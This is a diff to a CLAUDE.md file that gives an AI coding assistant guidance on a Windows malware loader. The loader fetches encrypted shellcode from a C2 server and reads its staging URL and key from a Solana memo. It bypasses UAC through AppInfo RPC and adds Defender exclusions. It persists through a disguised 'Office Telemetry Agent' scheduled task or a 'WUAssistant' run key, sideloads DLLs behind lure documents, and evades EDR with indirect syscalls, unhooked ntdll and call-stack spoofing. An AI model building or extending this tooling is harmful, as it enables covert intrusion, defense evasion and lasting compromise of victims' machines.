@@ -6,7 +6,14 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 
 ```bash
 # Step 1: Encrypt shellcode and generate Payload.h (required before every build)
-python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat
+# --sol-wallet  Solana wallet address whose FIRST (oldest) transaction holds the
+#               on-chain memo: <staging_url>|<32-hex-key>|<24-hex-nonce>
+#               The binary only embeds the wallet address — URL and key live on-chain.
+# --rpc         Optional custom RPC endpoint (default: api.mainnet-beta.solana.com)
+python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat --sol-wallet <ADDRESS>
+#   → produces: <basename>.dat (encrypted payload), Payload.h, memo.txt
+#   Upload <basename>.dat to your C2, then post the contents of memo.txt as a
+#   Solana memo transaction from <ADDRESS>. build.bat after that.
 
 # Step 2a: Compile as EXE (default)
 build.bat                                    # no UAC prompt
@@ -55,6 +62,150 @@ Each step returns FALSE on failure and the loader exits silently. Anti-analysis 
 
 The primary kick-off is user-mode fibers on the main thread — no new OS thread is created, so `PsSetCreateThreadNotifyRoutine` kernel callbacks do not fire. If any fiber API fails (e.g. host already `ConvertThreadToFiber`-converted), the loader falls back to the thread-pool path, which is still call-stack spoofed. The fallback's keep-alive is an alertable `NtWaitForSingleObject` on the NtCurrentProcess pseudo-handle, producing `Wait:UserRequest` instead of `Wait:DelayExecution` to defeat Hunt-Sleeping-Beacons / BeaconHunter heuristics.
 
+### Build Type Execution Flows
+
+Four build types × two run types (first run vs persistence reboot). Persistence mechanism differs by build type — **UAC builds use a scheduled task; non-UAC builds use a registry run key**.
+
+---
+
+#### EXE (non-UAC) — `build.bat`
+
+**First run** (`WUAssistant.exe`, any IL):
+```
+Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
+→ CleanupEvasion
+→ InstallPersistence → HKCU\...\Run "WUAssistant" = "C:\...\WUAssistant.exe"
+→ fiber / thread-pool → shellcode
+```
+
+**Persistence run** (HKCU run key fires at logon, medium IL):
+```
+Same as first run — InstallPersistence re-writes the key on every execution (no-op).
+Lure: none (EXE build has no bind file).
+```
+
+---
+
+#### EXE UAC — `build.bat uac`
+
+**First run** (`WUAssistant.exe`, medium IL):
+```
+Main() → evasion stack
+→ UacBypass(): IsFirstRunProcess=TRUE, IsInstallMode=FALSE
+  → AppInfo RPC bypass (AicLaunchAdminProcess winver + ComputerDefaults)
+  → SpawnChildOfParent: launch "WUAssistant.exe --install" as child of elevated ComputerDefaults
+  → NtTerminateProcess(self)                          ← medium-IL process exits here
+```
+
+**Elevated install run** (`WUAssistant.exe --install`, high IL — spawned by bypass):
+```
+Main() → evasion stack
+→ UacBypass(): IsInstallMode=TRUE → returns TRUE
+→ IsFirstRunProcess()=TRUE → InstallAndTerminate():
+    RunWdExclude (PS -EncodedCommand, elevated via AppInfo):
+      Add-MpPreference -ExclusionPath (full path chain + msoia.exe)
+      Register-ScheduledTask 'Office Telemetry Agent'
+        -Trigger AtLogon  -Principal RunLevel Highest  -Action msoia.exe
+    Sleep(8000)
+    CopyFileA self → %APPDATA%\Microsoft\Office\Updates\msoia.exe
+    NtTerminateProcess(self)                           ← install process exits here
+```
+
+**Persistence run** (`msoia.exe`, high IL — scheduled task fires at logon):
+```
+Main() → evasion stack
+→ UacBypass(): IsFirstRunProcess()=FALSE (filename == msoia.exe) → returns TRUE
+→ IsFirstRunProcess()=FALSE → skip InstallAndTerminate
+→ FetchSolMemo → download → decrypt → place shellcode
+→ CleanupEvasion
+→ [UAC_BYPASS defined → InstallPersistence NOT called]
+→ fiber / thread-pool → shellcode
+```
+
+---
+
+#### Sideload (non-UAC) — `build.bat sideload`
+
+**First run** (host EXE loads proxy DLL, any IL):
+```
+DllMain → InstallExitHook (patches RtlExitUserProcess → infinite PAUSE)
+→ TpAllocWork(SideloadWorker) → host EXE continues normally
+SideloadWorker:
+  [no REQUIRE_ELEVATION — no elevation check]
+  → LdrAddRefDll (pin proxy DLL)
+  → OpenBindFile  (ShellExecuteA lure doc from _\ folder)
+  → Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
+  → CleanupEvasion
+  → InstallPersistence → HKCU\...\Run "WUAssistant" = "<host.exe> /pf"
+  → fiber / thread-pool → shellcode
+```
+
+**Persistence run** (HKCU run key fires at logon, `/pf` arg, medium IL):
+```
+DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
+SideloadWorker:
+  [no REQUIRE_ELEVATION]
+  → LdrAddRefDll
+  → OpenBindFile: detects /pf in command line → skips lure
+  → Main() → evasion stack → ... → shellcode
+  → InstallPersistence (re-writes HKCU key, no-op)
+```
+
+---
+
+#### Sideload UAC — `build.bat sideload uac`
+
+**First run** (host EXE loads proxy DLL, medium IL):
+```
+DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
+SideloadWorker:
+  bPersistBoot=FALSE, IsElevated()=FALSE
+  → RelaunchElevatedAppInfo() — AppInfo RPC bypass (no UAC dialog)
+    → SpawnChildOfParent: relaunch host EXE elevated
+  → NtTerminateProcess(self)                          ← medium-IL instance exits
+```
+
+**Elevated first run** (host EXE elevated, proxy DLL loaded again):
+```
+DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
+SideloadWorker:
+  bPersistBoot=FALSE, IsElevated()=TRUE
+  → SideloadInstallAndContinue():
+      Add-MpPreference -ExclusionPath (full path chain + msoia.exe)  [PS -EncodedCommand via AppInfo]
+      Register-ScheduledTask 'Office Telemetry Agent'
+        -Trigger AtLogon  -Principal RunLevel Highest  -Action "msoia.exe" -Argument "/pf"
+      Sleep(8000)
+      CopyFileA host EXE → %APPDATA%\Microsoft\Office\Updates\msoia.exe
+      CopyFileA *.dll    → %APPDATA%\Microsoft\Office\Updates\
+      Start-ScheduledTask 'Office Telemetry Agent'      ← beacon starts immediately via scheduler
+  → NtTerminateProcess(self)                           ← elevated install process exits
+```
+
+**Persistence run** (`msoia.exe /pf`, high IL — scheduled task fires at logon):
+```
+DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
+SideloadWorker:
+  bPersistBoot=TRUE (detects /pf in command line)
+  → skip elevation check + skip SideloadInstallAndContinue
+  → LdrAddRefDll
+  → OpenBindFile: detects /pf → skips lure
+  → Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
+  → CleanupEvasion
+  → [UAC_BYPASS defined → InstallPersistence NOT called]
+  → fiber / thread-pool → shellcode
+```
+
+---
+
+**Persistence summary by build type:**
+
+| Build        | Mechanism      | Key / Task name          | Root | IL at reboot            |
+|--------------|----------------|--------------------------|------|-------------------------|
+| EXE          | HKCU Run key   | `WUAssistant`            | HKCU | Medium                  |
+| EXE UAC      | Scheduled task | `Office Telemetry Agent` | —    | High (RunLevel Highest) |
+| Sideload     | HKCU Run key   | `WUAssistant`            | HKCU | Medium                  |
+| Sideload UAC | Scheduled task | `Office Telemetry Agent` | —    | High (RunLevel Highest) |
+
 ### Module Responsibilities
 
 - **Syscalls.h/.c + AsmStub.asm** — Indirect syscall engine with gadget pool randomization. `InitializeNtSyscalls` does a single pass over ntdll's export table (hashing each name once) and matches against the 5 target syscalls in one scan. SSN extraction (via `ResolveSyscallStub`) pattern-matches `4C 8B D1 B8 XX XX 00 00` and falls back to neighbouring stubs (±0x20) if hooked. Before target resolution, `SwitchToCleanNtdll` maps `\KnownDlls\ntdll.dll` as a SEC_IMAGE section via `NtOpenSection` + `NtMapViewOfSection` and repoints the export-table cache at that unhooked copy; the section handle is closed via `NtClose` so no zombie handle appears in `NtQuerySystemInformation(SystemHandleInformation)`. `CollectSyscallGadgets()` scans ntdll's executable sections for all `0F 05 C3` (syscall;ret) patterns and stores up to 64 in a pool. `GetRandomGadget()` picks one per call via `RDTSC`. `SET_SYSCALL()` configures SSN + random gadget before `RunSyscall()`. AsmStub also contains `SpoofCallback` (callback entry with optional RSP swap + call-gadget injection), `SetSpoofTarget(target, gadget)`, and `SetSpoofStack(syntheticRsp)`.
@@ -67,7 +218,7 @@ The primary kick-off is user-mode fibers on the main thread — no new OS thread
 - **GhostHollow.c** — `GhostlyHollow`: alternative SEC_IMAGE-backed placement that skips NTFS transactions entirely. Copies the sacrificial DLL to `%TEMP%`, opens it with `FILE_FLAG_DELETE_ON_CLOSE` + `FILE_SHARE_DELETE`, writes the XOR-encrypted shellcode at .text raw offset, creates the SEC_IMAGE section, closes the file handle (file disappears from disk; the section keeps the kernel `FILE_OBJECT` alive via reference count), maps the section, decrypts in memory, flips to RX/RWX. Because no NTFS transaction is involved, Defender's MpFilter transaction-aware scanner is bypassed entirely — `transactionfile:_{GUID}:...` resources never appear in `Get-MpThreatDetection`. Used as tier-2 fallback after ModuleStomp.
 - **Gadgets.c** — `CollectCallGadgets` harvests `FF D3` (call rbx) gadgets from ntdll, kernel32, kernelbase, plus `dbgcore.dll`, `dbghelp.dll`, and `dsdmo.dll` into a 64-entry pool; a per-run RDTSC pick (`GetRandomCallGadget`) selects the return-address anchor injected into the call stack, defeating "single-return-address frequency" heuristics. The extra three modules are unexpected by Elastic 9.x callstack signatures (Almond Offensive Security, 2025-11), which model gadget origins as primarily ntdll/kernel32/kernelbase. Adding "weird" gadget sources breaks return-address baselines without changing legitimacy of any individual frame.
 - **Payload.h** — Auto-generated by `Encrypt.py`. Contains `#define` macros for XKEY_0..XKEY_3 (4-byte rotating XOR key), all XOR-encoded strings (`XSTR_*`), encoded URL (`INIT_ENCODED_URL`), protected Chaskey key (`INIT_PROTECTED_KEY`), Chaskey-CTR nonce (`INIT_CHASKEY_NONCE`), compression flag (`USE_COMPRESSION`), and **`INIT_PLACEMENT_XOR_KEY` (16 bytes, per-build random)** used by Phantom/Ghost to encrypt shellcode bytes during the file-write step. **Never edit manually.**
-- **Sideload.c** — DLL sideloading entry point (compiled only with `BUILD_DLL`). `DllMain` finds ntdll via PEB walk, patches `RtlExitUserProcess` (prevents host exit killing C2), resolves `TpAllocWork`/`TpPostWork` using JOAAT hashes, and queues `SideloadWorker` to a thread pool thread. With `REQUIRE_ELEVATION`: worker checks admin via `NtQueryInformationToken`, relaunches host EXE elevated via `ShellExecuteA("runas")` if needed, then self-terminates; elevated instance pins DLL (`LdrAddRefDll`) and runs `Main()`. Without `REQUIRE_ELEVATION`: worker pins DLL and runs `Main()` directly. Deferred execution avoids Loader Lock; host application continues normally.
+- **Sideload.c** — DLL sideloading entry point (compiled only with `BUILD_DLL`). `DllMain` finds ntdll via PEB walk, patches `RtlExitUserProcess` (prevents host exit killing C2), resolves `TpAllocWork`/`TpPostWork` using JOAAT hashes, and queues `SideloadWorker` to a thread pool thread. With `REQUIRE_ELEVATION`: worker checks admin via `NtQueryInformationToken`; if not elevated it relaunches the host EXE elevated — via `RelaunchElevatedAppInfo` (AppInfo RPC bypass, no UAC dialog) when `UAC_BYPASS` is defined, or via `ShellExecuteA("runas")` (standard UAC prompt) otherwise — then self-terminates. The elevated instance calls `SideloadInstallAndContinue` (WD exclusions + scheduled task + file copy), pins the DLL (`LdrAddRefDll`), opens the lure (`OpenBindFile`), and runs `Main()`. Without `REQUIRE_ELEVATION`: worker pins DLL, opens lure, and runs `Main()` directly. Deferred execution avoids Loader Lock; host application continues normally.
 - **Sideload.h** — Auto-generated by `SideloadGen.py`. Contains `#pragma comment(linker, "/export:...")` directives that forward every export from the proxy DLL to the renamed original DLL. The PE loader handles forwarding natively — no proxy code runs for legitimate API calls. **Never edit manually.**
 - **SideloadGen.py** — Parses a target DLL's PE export table (manual struct parsing, no external dependencies) and generates `Sideload.h` with export forwarding pragmas. Supports named exports and ordinal-only exports. Extracts and clones VS_VERSIONINFO into `Sideload.rc`. Usage: `python SideloadGen.py <target.dll> [--rename <name>] [--exe <host.exe>]`.
 
